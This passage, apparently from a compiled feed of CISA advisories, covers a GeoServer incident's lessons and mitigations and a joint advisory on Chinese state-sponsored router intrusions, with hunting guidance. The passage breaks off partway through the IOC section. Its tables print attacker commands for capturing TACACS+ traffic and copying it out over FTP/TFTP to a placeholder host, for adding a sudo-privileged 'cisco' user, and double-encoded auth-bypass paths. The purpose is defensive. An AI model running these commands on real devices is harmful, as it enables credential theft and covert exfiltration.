using their EDR tool. On July 31, 2024, their EDR tool identified a&nbsp; 1.txt file uploaded as suspected malware on the SQL Server. The SOC responded to additional alerts when the cyber threat actors transferred&nbsp; 1.txt to the SQL Server through&nbsp; bitsadmin after attempting other LOTL techniques, such as leveraging PowerShell and&nbsp; certutil . The alerts&nbsp;generated by this activity on the SQL server prompted the SOC to contain the server, initiate an investigation, request assistance from CISA, and uncover malicious activity on GeoServer 1. Lessons Learned CISA is sharing the following lessons learned based on what CISA learned about the organization’s security posture through incident detection and response activities. Vulnerabilities were not promptly remediated . The cyber threat actors exploited CVE-2024-36401 for initial access on two GeoServers. The vulnerability was disclosed June 30, 2024, and the cyber threat actors exploited it for initial access to GeoServer 1 on July 11, 2024. The vulnerability was added to CISA’s KEV Catalog on July 15, 2024, and by July 24, 2024, the vulnerability was not patched when the cyber threat actors exploited it for access to GeoServer 2. Note: FCEB agencies are required to remediate vulnerabilities in CISA’s KEV Catalog within prescribed timeframes under Binding Operational Directive (BOD) 22-01 . July 24, 2024, was within the KEV-required patching window for this CVE. However, CISA encourages FCEB agencies and critical infrastructure organizations to address KEV catalog vulnerabilities immediately as part of their vulnerability management plan. The agency did not test or exercise their IRP, nor did their IRP enable them to promptly engage third parties and grant third parties’ access to necessary resources . On Aug. 1, 2024, upon discovering the endpoint alerts, the agency conducted remote triage of affected systems and used their EDR tool to contain the intrusion. After containment, the agency engaged CISA to investigate potential threat actor persistence in their environment. Their IRP did not have procedures for bringing in third parties for assistance, which hampered CISA’s efforts to respond to the incident quickly and efficiently. The agency could not provide CISA remote access to their security information and event management (SIEM) tool, which initially kept CISA from reviewing all available logs, hindering CISA’s analysis. The agency had to go through their change control board process before CISA could deploy their EDR agents. The agency could have proactively identified these roadblocks by testing their IRP, such as via a tabletop exercise, but had not tested their plan for a long period. EDR alerts were not continuously reviewed, and some public-facing systems lacked endpoint protection . The activity remained undetected for three weeks; the agency missed an opportunity to detect this activity on July 15, 2024, as they did not observe an alert from GeoServer 1 where the EDR detected the Stowaway tool. The Web Server lacked endpoint protection. Indicators of Compromise See Table 1 for IOCs associated with this activity. Disclaimer: The IP addresses in this advisory were observed in August 2024, and some may be associated with legitimate activity. Organizations are encouraged to investigate the activity around these IP addresses prior to taking action, such as blocking. Activity should not be attributed as malicious without analytical evidence to support they are used at the direction of, or controlled by, threat actors. Table&nbsp;1.

Mitigations CISA recommends organizations implement the mitigations below to improve cybersecurity posture based on lessons learned from the engagement. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections. Establish a vulnerability management plan that includes procedures for prioritization and emergency patching. Prioritize patching of known exploited vulnerabilities listed in the KEV catalog. CISA urges organizations to address KEV catalog vulnerabilities immediately . Prioritize patching vulnerabilities in high-risk systems, including public facing systems as they are attractive targets for threat actors. Ensure high-risk systems are identified and prioritized for rapid patching by implementing asset management practices and conducting an asset inventory. Continuously discover and validate internet-facing assets through automated asset management and scanning (e.g., attack surface management tools, vulnerability scanners). Consider using a configuration management database (CMDB) with discovery and vulnerability tools to enrich asset context and support automated prioritization. Form a dedicated team responsible for assessing and implementing emergency patches, this team should include representatives from IT, security, and relevant business units. Maintain, practice, and update cybersecurity IRPs&nbsp; [ CPG 2.S , 5.A ]. Prepare a written IRP policy and IRP with senior leadership support. The policy should identify purpose and objectives, what constitutes an incident, prioritization or severity ratings of incidents, clear escalation procedures, IR personnel, and plans for notification, interaction and information sharing with media, law enforcement, and partners. The IRP should identify: Key personnel with knowledge of the network Key resources and courses of action (COAs) for containment and eradication in the event of compromise. Procedures for granting third parties prompt access to networks and security tools. This should include processes for expediating deployment of EDR and other security tools through change control boards (CCBs). The IRP should include procedures for establishing out-of-band communications systems and accounts in case primary systems are compromised or not available (such as with ransomware incidents). Periodically test the IRP under real-world conditions, such as via purple team engagements and tabletop exercises. During the test, include engagement with third party incident responders and external EDR agents and other tools. Following the test, update the IRP as necessary. See CISA’s Tabletop Exercise Packages for resources designed to assist organizations with conducting their own exercises. For more information on IRPs, see the National Institute of Science and Technology’s (NIST’s) SP 800-61 Rev. 3, Incident Response Recommendations and Considerations for Cybersecurity Risk Management: A CSF 2.0 Community Profile . Implement comprehensive (i.e., large coverage) and verbose (i.e., detailed) logging and aggregate logs in an out-of-band, centralized location. Prepare SOCs with sufficient resources to monitor collected logs and responses to malicious cyber threat activity. Consider using a SIEM solution for log aggregation and management. Identify, alert on, and investigate abnormal network activity (as threat actor activity generates unusual network traffic across all phases of the attack chain). Abnormal activity to look for includes: Running scans to discover other network connected devices. Running commands to list, add, or alter administrator accounts. Using PowerShell to download and execute remote programs. Running scripts not usually seen on a network. For additional information, see joint guide Identifying and Mitigating Living off the Land Techniques , which provides prioritized detection recommendations that enable behavior analytics, anomaly detection, and proactive hunting. In addition to the above, CISA recommends organizations implement the following mitigations based on threat actor activity: Require phishing-resistant MFA &nbsp; for access to all privileged accounts and email services accounts [ CPG 2.H ]. Implement allowlisting for applications, scripts, and network traffic to prevent unauthorized execution and access. Validate Security Controls In addition to applying mitigations, CISA recommends exercising, testing, and validating your organization’s security program against the threat behaviors mapped to the MITRE ATT&amp;CK Matrix for Enterprise framework in this advisory. CISA recommends testing your existing security controls inventory to assess how they perform against the ATT&amp;CK techniques described in this advisory. To get started: Select an ATT&amp;CK technique described in this advisory (see Table 3 through Table 11 ). Align your security technologies against the technique. Test your technologies against the technique. Analyze your detection and prevention technologies’ performance. Repeat the process for all security technologies to obtain a set of comprehensive performance data. Tune your security program, including people, processes, and technologies, based on the data generated by this process. CISA recommends continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&amp;CK techniques identified in this advisory.

## 48. Countering Chinese State-Sponsored Actors Compromise of Networks Worldwide to Feed Global Espionage System
**Link:** https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-239a  
**Published:** Mon, 25 Aug 2025 09:36:40 EDT  
**Source:** CISA Cybersecurity Advisories

**Summary:** Executive summary People’s Republic of China (PRC) state-sponsored cyber threat actors are targeting networks globally, including, but not limited to, telecommunications, government, transportation, lodging, and military infrastructure networks. While these actors focus on large backbone routers of major telecommunications providers, as well as provider edge (PE) and customer edge (CE) routers, they also leverage compromised devices and trusted connections to pivot into other networks. These actors often modify routers to maintain persistent, long-term access to networks.&nbsp; This activity partially overlaps with cyber threat actor reporting by the cybersecurity industry—commonly referred to as Salt Typhoon, OPERATOR PANDA, RedMike, UNC5807, and GhostEmperor, among others. The authoring agencies are not adopting a particular commercial naming convention and hereafter refer to those responsible for the cyber threat activity more generically as “Advanced Persistent Threat (APT) actors” throughout this advisory. This cluster of cyber threat activity has been observed in the United States, Australia, Canada, New Zealand, the United Kingdom, and other areas globally. This Cybersecurity Advisory (CSA) includes observations from various government and industry investigations where the APT actors targeted internal enterprise environments, as well as systems and networks that deliver services directly to customers. This CSA details the tactics, techniques, and procedures (TTPs) leveraged by these APT actors to facilitate detection and threat hunting, and provides mitigation guidance to reduce the risk from these APT actors and their TTPs. This CSA is being released by the following authoring and co-sealing agencies: United States National Security Agency (NSA) United States Cybersecurity and Infrastructure Security Agency (CISA) United States Federal Bureau of Investigation (FBI) United States Department of Defense Cyber Crime Center (DC3) Australian Signals Directorate’s Australian Cyber Security Centre (ASD’s ACSC) Canadian Centre for Cyber Security (Cyber Centre) Canadian Security Intelligence Service (CSIS) New Zealand National Cyber Security Centre (NCSC-NZ) United Kingdom National Cyber Security Centre (NCSC-UK) Czech Republic National Cyber and Information Security Agency (NÚKIB) - Národní úřad pro kybernetickou a informační bezpečnost Finnish Security and Intelligence Service (SUPO) - Suojelupoliisi Germany Federal Intelligence Service (BND) - Bundesnachrichtendienst Germany Federal Office for the Protection of the Constitution (BfV) - &nbsp; Bundesamt für Verfassungsschutz Germany Federal Office for Information Security (BSI) - Bundesamt für Sicherheit in der Informationstechnik Italian External Intelligence and Security Agency (AISE) - Agenzia Informazioni e Sicurezza Esterna Italian Internal Intelligence and Security Agency (AISI) - Agenzia Informazioni e Sicurezza Interna Japan National Cybersecurity Office (NCO) - 国家サイバー統括室 Japan National Police Agency (NPA) - 警察庁 Netherlands Defence Intelligence and Security Service (MIVD) - Militaire Inlichtingen- en Veiligheidsdienst Netherlands General Intelligence and Security Service (AIVD) - Algemene Inlichtingen- en Veiligheidsdienst Polish Military Counterintelligence Service (SKW) - Służba Kontrwywiadu Wojskowego Polish Foreign Intelligence Agency (AW) - Agencja Wywiadu Spain National Intelligence Centre (CNI) - Centro Nacional de Inteligencia The authoring agencies strongly urge network defenders to hunt for malicious activity and to apply the mitigations in this CSA to reduce the threat of Chinese state-sponsored and other malicious cyber activity. Any mitigation or eviction measures listed within are subject to change as new information becomes available and ongoing coordinated operations dictate. Network defenders should ensure any actions taken in response to the CSA are compliant with local laws and regulations within the jurisdictions within which they operate.&nbsp; Background The APT actors have been performing malicious operations globally since at least 2021. These operations have been linked to multiple China-based entities, including at least Sichuan Juxinhe Network Technology Co. Ltd. (四川聚信和网络科技有限公司), Beijing Huanyu Tianqiong Information Technology Co., Ltd. (北京寰宇天穹信息技术有限公司), and Sichuan Zhixin Ruijie Network Technology Co., Ltd. (四川智信锐捷网络科技有限公司). These companies provide cyber-related products and services to China’s intelligence services, including multiple units in the People’s Liberation Army and Ministry of State Security. The data stolen through this activity against foreign telecommunications and Internet service providers (ISPs), as well as intrusions in the lodging and transportation sectors, ultimately can provide Chinese intelligence services with the capability to identify and track their targets’ communications and movements around the world.

While not all encompassing, the following are the most notable threat group names related to this activity and commonly used within the cybersecurity community: Salt Typhoon, OPERATOR PANDA, RedMike, UNC5807, and GhostEmperor.&nbsp; Note : Cybersecurity companies have different methods of tracking and attributing cyber actors, and this may not be a 1:1 correlation to the authoring agencies’ understanding for all activity related to these groupings. Technical details The following sections are a compilation of TTPs the APT actors have used since at least 2021 to target enterprise environments. Particularly notable TTPs include modifying router configurations for lateral movement pivoting between networks and using virtualized containers on network devices to evade detection. The actors continue to use many of the TTPs listed, but expect them to evolve when existing TTPs no longer achieve their goals. Even if no longer used regularly, the actors may still use previous TTPs opportunistically in favorable conditions. The TTP descriptions can also be useful to network defenders for retroactive threat hunting. Note : This advisory uses the MITRE ATT&amp;CK® for Enterprise framework, version 17 and MITRE ATT&amp;CK for ICS framework, version 17 . See the Appendix A: MITRE ATT&amp;CK Tactics and Techniques section of this advisory for a table of the APT actors’ activity mapped to MITRE ATT&amp;CK tactics and techniques. Initial access Investigations associated with these APT actors indicate that they are having considerable success exploiting publicly known common vulnerabilities and exposures (CVEs) and other avoidable weaknesses within compromised infrastructure [ T1190 ]. Exploitation of zero-day vulnerabilities has not been observed to date. The APT actors will likely continue to adapt their tactics as new vulnerabilities are discovered and as targets implement mitigations, and will likely expand their use of existing vulnerabilities. The following list is not exhaustive and the authoring agencies suspect that the APT actors may target other devices (e.g., Fortinet firewalls, Juniper firewalls, Microsoft Exchange, Nokia routers and switches, Sierra Wireless devices, Sonicwall firewalls, etc.).&nbsp; If not yet patched, defenders should prioritize the following CVEs due to their historical exploitation on exposed network edge devices by these APT actors. Example exploited CVEs, ordered by year, include: CVE-2024-21887 - Ivanti Connect Secure and Ivanti Policy Secure web-component command injection vulnerability, commonly chained after CVE-2023-46805 (authentication bypass) CVE-2024-3400 - Palo Alto Networks PAN-OS GlobalProtect arbitrary file creation leading to OS command injection. The CVE allows for unauthenticated remote code execution (RCE) on firewalls when GlobalProtect is enabled on specific versions/configurations. CVE-2023-20273 - Cisco Internetworking Operating System (IOS) XE software web management user interface post-authentication command injection/privilege escalation (commonly chained with CVE-2023-20198 for initial access to achieve code execution as root) [ T1068 ] CVE-2023-20198 - Cisco IOS XE web user interface authentication bypass vulnerability While exploiting CVE-2023-20198, the APT actors used the Web Services Management Agent (WSMA) endpoints /webui_wsma_Http or /webui_wsma_Https to bypass authentication and create unauthorized administrative accounts. In some cases, the APT actors obfuscated requests by “double encoding” portions of the path, e.g., /%2577eb%2575i_%2577sma_Http or /%2577eb%2575i_%2577sma_Https [ T1027.010 ]. Observed requests varied in case, so hunting and detection should be case-insensitive and tolerant of over-encoding. After patching this CVE, WSMA endpoints requests are internally proxied, and the system adds a Proxy-Uri-Source HTTP header as part of the remediation logic. The presence of Proxy-Uri-Source header in traffic to /webui_wsma_* indicates a patched device handling the request, not exploitation. This can help distinguish between vulnerable and remediated systems when analyzing logs or captures. CVE-2018-0171 - Cisco IOS and IOS XE smart install remote code execution vulnerability The APT actors leverage infrastructure, such as virtual private servers (VPSs) [ T1583.003 ] and compromised intermediate routers [ T1584.008 ], that have not been attributable to a publicly known botnet or obfuscation network infrastructure to target telecommunications and network service providers, including ISPs [ T1090 ].&nbsp; The APT actors may target edge devices regardless of who owns a particular device. Devices owned by entities who do not align with the actors’ core targets of interest still present opportunities for use in attack pathways into targets of interest. The actors leverage compromised devices and trusted connections or private interconnections (e.g., provider-to-provider or provider-to-customer links) to pivot into other networks [ T1199 ]. In some instances, the actors modify routing and enable traffic mirroring (switch port analyzer (SPAN)/remote SPAN (RSPAN)/encapsulated remote SPAN (ERSPAN) where available) on compromised network devices and configure Generic Routing Encapsulation (GRE)/IPsec tunnels and static routes to achieve the same goal [ T1095 ]. Additionally, these APT actors often simultaneously exploit large numbers of vulnerable, Internet-exposed devices across many IP addresses and may revisit individual systems for follow-on operations. Initial access vectors remain a critical information gap for parties working to understand the scope, scale, and impact of the actors’ malicious activity. The authoring agencies encourage organizations to provide compromise details to appropriate authorities (see Contact information ) to continue improving all parties’ understanding and responses. Persistence To maintain persistent access to target networks, the APT actors use a variety of techniques. Notably, a number of these techniques can obfuscate the actors’ source IP address in system logs, as their actions may be recorded as originating from local IP addresses [ T1027 ]. Specific APT actions include: Modifying Access Control Lists (ACLs) to add IP addresses. This alteration allows the actors to bypass security policies and maintain ongoing access by explicitly permitting traffic from a threat actor-controlled IP address [ T1562.004 ]. The APT actors often named their ACLs “access-list 20”. When 20 was already used, the actors commonly used 50 or 10. Opening standard and non-standard ports, which can open and expose a variety of different services (e.g., Secure Shell [SSH], Secure File Transfer Protocol [SFTP], Remote Desktop Protocol [RDP], File Transfer Protocol [FTP], HTTP, HTTPS) [ T1071 ]. This strategy supplies multiple avenues for remote access and data exfiltration. Additionally, utilizing non-standard ports can help the APT actors evade detection by security monitoring tools that focus on standard port activity [ T1571 ]. The APT actors have been enabling SSH servers and opening external-facing ports on network devices to maintain encrypted remote access [ T1021.004 ]. In some cases, the SSH services were established on high, non-default Transmission Control Protocol (TCP) ports using the port numbering scheme of 22x22 or xxx22 , though port patterns may vary across intrusions. The actors may add keys to existing SSH services to regain entry into network devices [ T1098.004 ]. The APT actors enable or abuse built-in HTTP/HTTPS management servers and sometimes reconfigure them to non-default high ports. Note: HTTP servers have been observed using the port numbering scheme of 18xxx . Enabling HTTP/HTTPS servers on Cisco devices affected by CVE-2023-20198. If the web UI feature is enabled on Cisco IOS XE Software, this vulnerability provides an entry opportunity for the APT actors. Following compromise of a router, the following&nbsp;commands and activities have been observed on compromised devices [ T1059.008 ]: Executing commands via SNMP [ T1569 ]. SSH activity from remote or local IP addresses. Web interface panel (POST) requests. When present, using service or automation credentials (e.g., those used by configuration-archival systems such as RANCID) to enumerate and access other networking devices. Executing Tcl scripts (e.g., TCLproxy.tcl and map.tcl ) on Cisco IOS devices where tclsh was available. Depending on the configuration of the Simple Network Management Protocol (SNMP) on the compromised network device, the APT actors enumerate and alter the configurations for other devices in the same community group, when possible [ T1021 ]. Note : Properly configured SNMPv3 is considerably more secure than previous versions. Utilizing SNMPwalk (SNMP GET/WALK) to enumerate devices from APT actor-controlled hosts. Where configuration changes were observed, they were issued as SNMP SET requests to writable objects from those hosts [ T1016 ]. Creating tunnels over protocols, such as Generic Routing Encapsulation (GRE), multipoint GRE (mGRE), or IPsec, on network devices, presumably based on what would be expected in the environment [ T1572 ]. These tunnels allow for the encapsulation of multiple network layer protocols over a single tunnel, which can create persistent and covert channels for data transmission to blend in with normal network traffic. Some of these actions may obscure the APT actors’ source IP address in logs due to being logged as a local IP. Running commands in an on-box Linux container on supported Cisco networking devices to stage tools, process data locally, and move laterally within the environment. This often allows the APT actors to conduct malicious activities undetected because activities and data within the container are not monitored closely. [ T1610 ] [ T1588.002 ] [ T1588.005 ] [ T1059.006 ]. Within Guest Shell, running Python (such as siet.py to exploit Cisco Smart Install) and native Linux tooling, installing packages (e.g., via pip / yum where available), parsing and staging locally collected artifacts (e.g., configurations, packet captures) on device storage [ T1560 ]. On NX-OS devices specifically, using dohost to script host-level CLI actions for reconnaissance and persistence. For Cisco IOS XE, Guest Shell is a Linux container (LXC) managed by IOx that is enabled with guestshell enable and accessed with guestshell run bash . By default, processes inside Guest Shell egress via the management virtual routing and forwarding (VRF) instance. On platforms without a dedicated management port, connectivity can be provided with a VirtualPortGroup interface. Guest Shell can execute Python and other 64-bit Linux applications and can read/write device-accessible storage (e.g., flash) as configured. [ T1609 ] [ T1543.005 ] For Cisco NX-OS, Guest Shell is an LXC environment entered with run guestshell . It has direct access to bootflash: and can invoke host NX-OS CLI via the dohost utility. Networking uses the device’s default VRF by default. Operators (or malware) can run commands in other VRFs using chvrf . Systemd-managed services are typically long-running components inside Guest Shell. Using guestshell disable and guestshell destroy commands to deactivate and uninstall Guest Shell container and return all resources to the system [ T1070.009 ]. Leveraging open source multi-hop pivoting tools, such as&nbsp;STOWAWAY, to build chained relays for command and control (C2) and operator access, including interactive remote shells, file upload and download, SOCKS5/HTTP proxying, and local/remote port mapping with support for forward and reverse connections over encrypted node-to-node links [ T1090.003 ]. Lateral movement &amp; collection Following initial access, the APT actors target protocols and infrastructure involved in authentication—such as Terminal Access Controller Access Control System Plus (TACACS+)—to facilitate lateral movement across network devices, often through SNMP enumeration and SSH. From these devices, the APT actors passively collect packet capture (PCAP) from specific ISP customer networks [ T1040 ] [ T1005 ]. To further support discovery and lateral movement, the APT actors may target:&nbsp; Authentication Protocols including TACACS+ and Remote Authentication Dial-In User Service (RADIUS) Managed Information Base (MIB) [ T1602.001 ] Router interfaces Resource Reservation Protocol (RSVP) sessions Border Gateway Protocol (BGP) routes Installed software Configuration files [ T1590.004 ] [ T1602.002 ] This is achieved either from existing sources in the network (e.g., output of provider scripts) or through active survey of devices and Trivial File Transfer Protocol (TFTP), to include Multiprotocol Label Switching (MPLS) configuration information. In-transit network traffic using native capabilities to capture or mirror traffic via the SPAN, RSPAN, or ERSPAN capabilities available on many router models. Provider-held data, such as: Subscriber information User content Customer records and metadata Network diagrams, inventories, device configurations, and vendor lists Passwords Capturing network traffic containing credentials via compromised routers is a common method for further enabling lateral movement [ T1040 ]. This typically takes the form of: Leveraging native PCAP functionalities (e.g., Cisco’s Embedded Packet Capture) on routers to collect RADIUS or TACACS+ authentication traffic, which may contain credentials transmitted in cleartext or weakly protected forms. PCAPs have been observed containing naming schemes such as mycap.pcap ,&nbsp; tac.pcap ,&nbsp; 1.pcap , or similar variations. Modifying a router’s TACACS+ server configuration to point to an APT actor-controlled IP address [ T1556 ]. These actors may use this capability to capture authentication attempts from network administrators or other devices. They may also adjust Authentication, Authorization, and Accounting (AAA) configurations, forcing devices to use less secure authentication methods or send accounting information to their infrastructure. The APT actors collect traffic at Layer 2 or 3 (depending on the protocol used), largely from Cisco IOS devices; however, targeting of other device types is also likely. Based on analysis, the APT actors hold interest in making configuration and routing changes to the devices after compromising the routers. While some actions are specific to Cisco devices, the actors are capable of targeting devices from other vendors and could utilize similar functionality. The APT actors perform several of the modifications or techniques below to facilitate follow-on actions. Creating accounts/users and assigning privileges to those accounts, often via modifying router configurations [ T1136.001 ]. Brute forcing and re-using credentials to access Cisco devices. If a router configuration is collected during initial exploitation and contains a weak hashed Cisco Type 5 (MD5) or 7 (legacy, weak reversible encoding) password [ T1003 ] [ T1110.002 ]. Weak credentials, such as “cisco” as the username and password, are routinely exploited through these techniques. Scanning for open ports and services and mirroring (SPAN/RSPAN sessions), allowing traffic monitoring from multiple interfaces [ T1595 ]. Running commands on the router via SNMP, SSH, and HTTP GET or POST requests. These requests typically target privileged execution paths, such as /level/15/exec/-/* , and may include instructions to display configuration files, access BGP routes, manage VRF instances, or clear system logs [ T1082 ]. Many compromised devices use well known SNMP community strings, including “public” and “private”. Configuring PCAP capabilities to collect network traffic. Configuring tunnels. Using monitoring tools present in the environment to monitor a device’s (commonly a router’s) configuration changes. Updating routing tables to route traffic to actor-controlled infrastructure. Using several techniques to avoid detection of their activity, including: Deleting and/or clearing logs, possibly in tandem with reverting or otherwise modifying stored configuration files to avoid leaving traces of the modifications [ T1070 ]. Disabling logging and/or disabling sending logs to central servers. Stopping/starting event logging on network devices. Configuring a Cisco device to run a Guest Shell container to evade detection from collecting artifacts, data, or PCAP [ T1610 ]. Exfiltration A key concern with exfiltration is the APT actors’ abuse of peering connections (i.e., a direct interconnection between networks that allows traffic exchange without going through an intermediary) [ T1599 ]. Exfiltration may be facilitated due to a lack of policy restraints or system configurations limiting the types of data received by peered ISPs. Analysis indicates that the APT actors leverage separate (potentially multiple) command and control channels for exfiltration to conceal their data theft within the noise of high-traffic nodes, such as proxies and Network Address Translation (NAT) pools. The APT actors often use tunnels, such IPsec and GRE, to conduct C2 and exfiltration activities [ T1048.003 ]. Case study This section details techniques employed by the APT actors, as well as indicators received from analysis to detect this activity. The APT actors were stopped before further actions could be taken on the compromised network. Collecting native PCAP The APT actors collected PCAPs using native tooling on the compromised system, with the primary objective likely being to capture TACACS+ traffic over TCP port 49. TACACS+ packet bodies can be decrypted if the encryption key is known. In at least one case, the device configuration stored the TACACS+ shared secret using Cisco Type 7 reversible obfuscated encoding. Recovering that secret from the configuration would enable offline decryption of captured TACACS+ payloads. TACACS+ traffic is used for authentication, often for administration of network equipment and including highly privileged network administrators accounts and credentials, likely enabling the actors to compromise additional accounts and perform lateral movement.&nbsp; The commands listed in Table 1 were observed on a Cisco IOS XE-based host to aid PCAP exfiltration. Table 1 : Commands to collect PCAP Command&nbsp;&nbsp;&nbsp;&nbsp; Description monitor capture mycap interface &lt;interface-name&gt; both Set up a packet capture named 'mycap' monitor capture mycap match ipv4 protocol tcp any any eq 49&nbsp; Target port 49 on the above interface - TACACS+ monitor capture mycap buffer size 100 monitor capture mycap start Start the capture show monitor capture mycap buffer brief Check status of capture monitor capture mycap export bootflash:tac.pcap Export PCAP to file, staging for exfiltration copy bootflash:tac.pcap ftp://&lt;domain/service&gt;:*@&lt;IP&gt; Exfiltration copy bootflash:tac.pcap tftp://&lt;IP&gt;/tac.pcap Host-level indicators If console logging or visibility of remote FTP/TFTP from a network appliance are available, the following host-level indicators may assist with detecting activity:&nbsp; Capture name: 'mycap'&nbsp; Capture rule: 'match ipv4 protocol tcp any any eq 49'&nbsp; Exported pcap filename: 'tac.pcap' tftp remote filename: 'tac.pcap'&nbsp; tftp remote IP: [remote IP] &nbsp; Enabling SSH access to the underlying Linux host on IOS XR Cisco IOS XR (64-bit) is a Linux-based network operating system built on a Yocto-based Wind River Linux distribution. IOS XR is typically administered via the IOS XR CLI over SSH on port TCP/22 or via console.&nbsp; The built-in sshd_operns service exposes an additional SSH endpoint on the host Linux. When enabled, it listens on TCP/57722 and provides direct shell access to the host OS. Root logins are not permitted to this service, as only non-root accounts can authenticate. On IOS XR, sshd_operns is disabled by default and must be explicitly started (e.g., service sshd_operns start). Persistence across reboots requires enabling at init ( chkconfig ) or equivalent. In observed intrusions, the APT actors enabled sshd_operns , created a local user, and granted it sudo privileges (e.g., by editing /etc/sudoers or adding a file under /etc/sudoers.d/ ) to obtain root on the host OS after logging in via TCP/57722.&nbsp; The commands listed in Table 2 were executed from the host Linux bash shell as root. Table 2 : Commands to add user to sudoers Command&nbsp;&nbsp;&nbsp;&nbsp; Description service sshd_operns start Starting the sshd_operns service useradd cisco password cisco Adding a new user sudo vi /etc/sudoers Adding the new user to sudoers chmod 4755 /usr/bin/sudo As 4755 is the default permissions for sudo, it is unclear why the actors executed this command Threat hunting guidance The authoring agencies encourage network defenders of critical infrastructure organizations, especially telecommunications organizations, to perform threat hunting, and, when appropriate, incident response activities. If malicious activity is suspected or confirmed, organizations should consider all mandatory reporting requirements to relevant agencies and regulators under applicable laws and regulations, and any additional voluntary reporting to appropriate agencies, such as cybersecurity or law enforcement agencies who can provide incident response guidance and assistance with mitigation. See the Contact information section for additional reporting information. The malicious activity described in this advisory often involves persistent, long-term access to networks where the APT actors maintain several methods of access. Network defenders should exercise caution when sequencing defensive measures to maximize the chance of achieving full eviction, while remaining compliant with applicable laws, regulations, and guidance on incident response and data breach notifications in their jurisdictions. Where possible, gaining a full understanding of the APT actors’ extent of access into networks followed by simultaneous measures to remove them may be necessary to achieve a complete and lasting eviction. Partial response actions may alert the actors to an ongoing investigation and jeopardize the ability to conduct full eviction. Incident response on one network may also result in the APT actors taking measures to conceal and maintain their access on additional compromised networks, and potentially disrupt broader investigative and operational frameworks already in progress. The APT actors often take steps to protect their established access, such as compromising mail servers or administrator devices/accounts to monitor for signs that their activity has been detected. Organizations should take steps to protect the details of their threat hunting and incident response from APT actor monitoring activities. The authoring agencies strongly encourage organizations to conduct the following actions for threat hunting: Monitor configurations changes Pull all configurations for running networking equipment and check for differences with latest authorized versions. Review remote access configurations for proper application of ACL and transport protocols. Review ACLs for any unauthorized modifications. If SNMP is being used, ensure networking equipment is configured to use SNMPv3 with the appropriate authentication and privacy configurations set, as defined in the User-based Security Model (USM) and the View-based Access Control Model (VACM). Verify the authenticity of any configured local accounts and their permission levels. Check all routing tables to ensure that all routes are authorized and expected. Verify that any PCAP commands configured on networking equipment are authorized. Monitor virtualized containers If networking equipment has the capability to run virtualized containers, ensure that all running virtualized containers are expected and authorized. For devices that support Cisco Guest Shell (IOS XE and NX-OS), do not rely on device syslog alone to detect actor activity. Use a combination of device syslog, AAA command accounting, container (Guest Shell) logs, and off-box flow/telemetry. Capture lifecycle and CLI activity with AAA accounting (TACACS+/RADIUS) for configuration/exec commands so that enable/disable and entry actions are recorded. For IOS XE, hunt for guestshell enable , guestshell run bash , and guestshell disable . On NX-OS, hunt for guestshell enable , run guestshel l, and guestshell destroy . Alert on unexpected use of chvrf (running commands under a different VRF) and, on NX-OS, use of dohost (container invoking host CLI). Monitor network services and tunnels Monitor for management services running on non-standard ports (SSH, FTP, etc.). Hunt for actor-favored protocol patterns: SSH on high non-default ports with 22x22/xxx22 numbering patterns from non-admin source IPs. HTTPS/Web UI listeners on non-default high ports (18xxx) reachable from outside the management VRF. TCP/57722 (IOS XR sshd_operns ) reachability or flows. Hunt for TCP/57722 listeners on IOS XR platforms (the host Linux sshd_operns service). Collect flow/telemetry (NetFlow/IPFIX) from the management VRF. Any inbound TCP/57722 should be treated as high-risk if unexpected. TACACS+ (TCP/49) flows to non-approved IPs or any TACACS+ traffic leaving the management VRF. Correlate with device configuration to detect redirection of TACACS+ servers to APT actor-controlled infrastructure. FTP/TFTP flows originating from network devices to unapproved destinations, especially when preceded by on-box PCAP collection activity. Audit any tunnel that transits a security boundary, such as peering points between providers, to ensure it can be accounted for by network administrators. In particular, examine: Unexplained or unexpected tunnels between Autonomous System Numbers (ASNs). Unauthorized use of file transfer protocols, such as FTP and TFTP. Monitor network traffic for abnormal volumes of files transfers to internal FTP servers, which the APT actors may use as staging areas prior to data exfiltration. Extensive SSH activity against routers, followed by the establishment of both an incoming tunnel and outgoing tunnel—each of which may leverage different protocols. Monitor firmware and software integrity Perform hash verification on firmware and compare values against the vendor's database to detect unauthorized modification to the firmware. Ensure that the firmware version is as expected. Compare hashes of images both on disk and in memory against known-good values. Reference the Network Device Integrity (NDI) Methodology or Network Device Integrity (NDI) on Cisco IOS Devices for more information. Use the product’s run-time memory validation or integrity verification tool to identify any changes to the run-time firmware image. Where supported by the platform, enable image and configuration integrity features, such as signed image enforcement and secure configuration checkpoints. Alert on any boot-time or run-time verification failure. Check any available file directories that may exist (flash, non-volatile random-access memory [NVRAM], system, etc.) for non-standard files. Monitor logs Review logs forwarded from network devices for indications of potential malicious behavior, such as: Evidence of clearing locally stored logs, Disabling log creation or log forwarding, Starting a PCAP recording process using available functions, Allowing remote access via non-standard methods or to new locations, and Changes to configuration of devices via non-standard methods or from unexpected locations. Alert on creation/start of any on-box packet capture (e.g., monitor capture ... start , Embedded Packet Capture) or SPAN/RSPAN/ERSPAN session definitions, especially those matching TACACS+ (TCP/49) or RADIUS. Inventory and continuously watch monitor session ... (SPAN/ERSPAN) and PCAP state. Naming patterns include mycap and output filenames like mycap.pcap , tac.pcap , and 1.pcap . Where supported, deploy embedded event triggers (e.g., EEM on IOS XE/NX-OS) to syslog any invocation of packet-capture or span/erspan configuration commands, capturing the invoking username and source. Audit for non-root local accounts granted sudo on XR host Linux (e.g., via /etc/sudoers or /etc/sudoers.d/ ). Where supported, ensure the host operating system (OS) sshd_operns service is disabled and not listening. Validate at each reboot and device upgrade. Alert on config or telemetry indicating new XR host OS services, changes to systemd service states, or unexpected privilege escalations on the host OS. Analyze internal FTP Server logs for any logins from unexpected sources. Monitor network traffic for logons from one router to another router, as this should not be typical of normal router administration processes. If unauthorized activities are discovered, coordinate containment sequencing before disabling to avoid tipping active APT operators. Capture live artifacts (process lists, bound sockets, on-box files), then eradicate. See the Contact information section of this advisory for response actions that should be taken if malicious activity is confirmed. Indicators of compromise IP-based indicators The following IP indicators were associated with the APT actors’ activity from August 2021 to June 2025. Disclaimer : Several of these observed IP addresses were first observed as early as August 2021 and may no longer be in use by the APT actors. The authoring agencies recommend organizations investigate or vet these IP 